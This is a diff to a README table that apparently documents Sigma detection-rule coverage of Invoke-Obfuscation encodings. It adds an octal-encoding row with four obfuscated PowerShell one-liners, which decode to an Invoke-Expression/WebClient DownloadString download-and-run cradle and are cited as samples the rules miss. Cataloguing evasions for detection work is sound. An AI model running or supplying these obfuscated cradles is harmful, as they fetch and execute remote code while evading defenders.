@@ -243,6 +243,29 @@ you can copy the results from all cases for one or more obfuscation methods and 
   <td align="left">This option encodes the entire command as Hex.</td>
  </tr> 
  <tr>
+  <td align="center">13</td>
+  <td align="center">ENCODING\3</td>
+  <td nowrap>
+   <p><strong>Partialy covered by the same Sigma rules mentioned in case 10 (if you'll be able to implement a non case sensitive regex), that's because the source code block is copy/pasted into almost every encoding function so they can maintain zero dependencies and work on their own. These are examples of some not covered obfuscations:</strong></p>  
+   <p>IEX ( -jOIn ('111x156P166<157C153P145&55&105&170t160x162}145<163x163n151t157}156n40C50}116}145<167;55n117x142}152C145P143x164C40~116n145t164P56}127t145n142<103&154n151x145;156;164n51x56n104<157<167P156&154x157t141t144n123~164~162}151~156C147'.sPliT('&x<P}t~;nC' ) |FOReACh {([cOnVERT]::toINT16( ( [sTrinG]$_ ) ,8) -as[CHaR])}) )</p>
+   <p> [STRinG]::JOiN('',( (111,156 ,166 , 157, 153,145,55, 105, 170, 160 , 162 ,145 ,163,163,151 ,157 ,156,40,50, 116,145 ,167 , 55,117,142 ,152,145 , 143, 164,40 , 116 ,145,164 , 56 , 127 , 145, 142 ,103, 154, 151 ,145 ,156,164, 51, 56 ,104, 157, 167 , 156 ,154, 157,141 ,144,123,164 , 162 , 151 ,156, 147)|foReacH{([cHAR] ( [convERt]::ToINT16(( [striNG]$_) ,8))) } )) | iEx</p>
+   <p>INvOkE-EXpReSsION ( " $( sET-vAriABle 'oFS'  '' ) " +[STring]( ( 111,156 ,166 ,157 , 153,145 , 55, 105, 170,160 ,162 ,145 ,163, 163 , 151,157,156, 40 ,50 ,116, 145,167 ,55 , 117 ,142 ,152 ,145,143,164,40,116,145 ,164 , 56,127 ,145,142 ,103, 154,151 ,145, 156 ,164,51,56, 104 , 157,167,156 ,154, 157 ,141 ,144,123 , 164,162 , 151, 156,147 ) |FoREaCh{ ([cONVert]::TOiNt16(($_.tostriNg()) , 8) -aS [chAr])})+"$( sEt-ItEM  'vaRIaBlE:ofS'  ' ') " )</p>
+   <p> [STRINg]::JOIN('', ( '111V156~166~157{153V145:55,105%170{160{162V145o163o163X151{157V156%40V50V116>145%167R55o117V142,152~145:143{164,40V116V145:164R56X127%145:142~103R154>151,145%156~164%51%56~104:157~167:156o154,157V141R144o123~164,162{151:156{147'-sPlIt 'X' -spliT'V' -SPLIt '~' -spLiT '>' -SPLiT '%'-SPlIT'R'-sPLIt ':'-SPLit ',' -sPLIt'{'-sPlIt'o'|%{ ( [chAR] ([CONVeRT]::TOinT16( ($_.tosTrING()),8 ) )) } ))|INvOke-EXpReSsION</p>
+  </td>
+  <td align="left">This option encodes entire command as Octal</td>
+ </tr>
+ <tr>
+  <td align="center">14</td>
+  <td align="center">ENCODING\4</td>
+  <td nowrap> 
+   <p></p>
+   <p></p>
+   <p></p>
+   <p></p>
+  </td>
+  <td align="left"></td>
+ </tr> 
+ <tr>
   <td align="center"></td>
   <td align="center"></td>
   <td nowrap> 
